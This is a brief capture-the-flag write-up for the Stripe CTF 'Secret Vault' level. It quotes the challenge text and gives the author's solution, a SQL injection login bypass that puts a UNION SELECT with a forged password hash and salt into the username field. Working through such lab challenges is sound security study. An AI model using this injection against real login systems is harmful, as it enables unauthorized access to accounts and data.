After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.

A beta version has launched with some interesting secrets (including the password to access Level 4); you can check it out at https://level03-2.stripe-ctf.com/user-iqqsgsxrqp. As usual, you can fetch the code for the level (and some sample data) via git clone https://level03-2.stripe-ctf.com/user-iqqsgsxrqp/level03-code, or you can read the code below. 

My solution:

for password: 'aaaaaaa' and user: 'union select "1" as id, "9b880b7ecc43c68b916c403e94a62459595311225578580e030a2966c5896444" as password_hash, "test" as salt;--

